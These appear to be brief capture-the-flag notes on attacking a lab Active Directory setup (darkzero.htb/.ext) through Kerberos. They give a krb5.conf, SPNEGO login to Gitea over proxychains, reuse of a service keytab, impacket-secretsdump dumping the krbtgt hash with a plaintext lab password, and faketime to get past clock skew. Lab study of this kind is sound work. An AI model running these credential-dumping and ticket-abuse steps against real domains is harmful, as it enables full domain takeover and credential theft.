0. https://wiki.archlinux.org/title/Kerberos

1. use kerboros sso on firefox https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/5/html/deployment_guide/sso-config-firefox

2. https://learn.microsoft.com/en-us/entra/global-secure-access/how-to-configure-kerberos-sso

3. ticket asking
/etc/krb5.conf
```
[libdefaults]
default_realm = DARKZERO.EXT
dns_lookup_realm = false
dns_lookup_kdc = false
rdns = false
udp_preference_limit = 1
forwardable = true

[realms]
DARKZERO.EXT = {
    kdc = dc02.darkzero.ext
}
DARKZERO.HTB = {
    kdc = dc01.darkzero.htb
}

[domain_realm]
.darkzero.ext = DARKZERO.EXT
.darkzero.htb = DARKZERO.HTB
```

systemctl start krb5-kdc.service

systemctl start krb5-kadmind.service


4. kinit josh@DARKZERO.EXT

5. proxychains4 -q curl --negotiate -u : \
  -c cookies.txt -b cookies.txt \
  "http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1" \
  -L -v

6. 
// services
systemctl cat gitea-runner

// keytab finding
ls -la /tmp/krb5cc_gitea /etc/gitea-runner/

export KRB5CCNAME=/tmp/krb5cc_gitea
kinit -kt /etc/gitea-runner/svc-runner.keytab svc-runner
klist


7 .impacket-secretsdump & impacket-ticket
https://github.com/fortra/impacket
proxychains4 python3 impacket-secretsdump.py 'darkzero.ext/celia:babygurl13@172.16.20.2' -just-dc-user krbtgt


8. Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

FT="$(date -u -d '+7 hours' '+%Y-%m-%d %H:%M:%S')"
faketime "$FT" impacket-smbclient -k -no-pass DC01.darkzero.htb